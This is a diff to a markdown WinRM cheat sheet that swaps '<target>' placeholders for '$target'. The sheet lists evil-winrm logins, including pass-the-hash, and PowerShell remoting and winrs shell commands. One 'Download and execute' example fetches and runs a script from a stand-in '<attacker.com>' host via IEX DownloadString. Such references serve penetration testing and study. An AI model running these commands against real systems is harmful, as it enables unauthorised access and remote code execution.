@@ -16,31 +16,31 @@ tags:
 Basic connection
 
 ```sh
-evil-winrm -i <target> -u administrator -p '<password>'
+evil-winrm -i $target -u administrator -p '<password>'
 ```
 
 With domain
 
 ```sh
-evil-winrm -i <target> -u 'DOMAIN\<user>' -p '<password>'
+evil-winrm -i $target -u 'DOMAIN\<user>' -p '<password>'
 ```
 
 Using hash (*Pass-the-Hash*)
 
 ```sh
-evil-winrm -i <target> -u administrator -H 'NTHASH'
+evil-winrm -i $target -u administrator -H 'NTHASH'
 ```
 
 Using SSL (*port `5986`*)
 
 ```sh
-evil-winrm -i <target> -u administrator -p '<password>' -S
+evil-winrm -i $target -u administrator -p '<password>' -S
 ```
 
 With custom port
 
 ```sh
-evil-winrm -i <target> -u administrator -p '<password>' -P 5985
+evil-winrm -i $target -u administrator -p '<password>' -P 5985
 ```
 
 <!-- }}} -->
@@ -61,13 +61,13 @@ $cred = New-Object System.Management.Automation.PSCredential("administrator", $p
 Connect interactively
 
 ```sh
-Enter-PSSession -ComputerName <target> -Credential $cred
+Enter-PSSession -ComputerName $target -Credential $cred
 ```
 
 Run command remotely
 
 ```sh
-Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { whoami }
 ```
 
 Connect to multiple machines
@@ -88,19 +88,19 @@ Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostnam
 Execute single command
 
 ```sh
-winrs -r:http://<target>:5985 -u:administrator -p:<password> "whoami"
+winrs -r:http://$target:5985 -u:administrator -p:<password> "whoami"
 ```
 
 Interactive shell
 
 ```sh
-winrs -r:http://<target>:5985 -u:administrator -p:<password> cmd
+winrs -r:http://$target:5985 -u:administrator -p:<password> cmd
 ```
 
 With domain
 
 ```sh
-winrs -r:http://<target>:5985 -u:DOMAIN\<username> -p:<password> cmd
+winrs -r:http://$target:5985 -u:DOMAIN\<username> -p:<password> cmd
 ```
 
 <!-- }}} -->
@@ -132,7 +132,6 @@ Connect using Ruby [WinRM](https://github.com/WinRb/WinRM) library
 <!-- }}} -->
 
 ___
-
 <!-- }}} -->
 
 <!-- Commands {{{-->
@@ -145,7 +144,7 @@ Basic command execution
 > [!example]-
 >
 > ```sh
-> Invoke-Command -ComputerName <target> -ScriptBlock { whoami }
+> Invoke-Command -ComputerName $target -ScriptBlock { whoami }
 > ```
 
 Multiple commands
@@ -153,7 +152,7 @@ Multiple commands
 > [!example]-
 >
 > ```sh
-> Invoke-Command -ComputerName <target> -ScriptBlock {
+> Invoke-Command -ComputerName $target -ScriptBlock {
 >   whoami
 >   hostname
 >   ipconfig
@@ -165,7 +164,7 @@ Execute local script on remote
 > [!example]-
 >
 > ```sh
-> Invoke-Command -ComputerName <target> -FilePath .\script.ps1
+> Invoke-Command -ComputerName $target -FilePath .\script.ps1
 > ```
 
 Download and execute
@@ -173,7 +172,7 @@ Download and execute
 > [!example]-
 >
 > ```sh
-> Invoke-Command -ComputerName <target> -ScriptBlock {
+> Invoke-Command -ComputerName $target -ScriptBlock {
 >   IEX(New-Object Net.WebClient).DownloadString('http://<attacker.com>/script.ps1')
 > }
 > ```
@@ -215,5 +214,4 @@ PowerShell remoting cmdlets
 <!-- }}} -->
 
 ___
-
 <!-- }}} -->
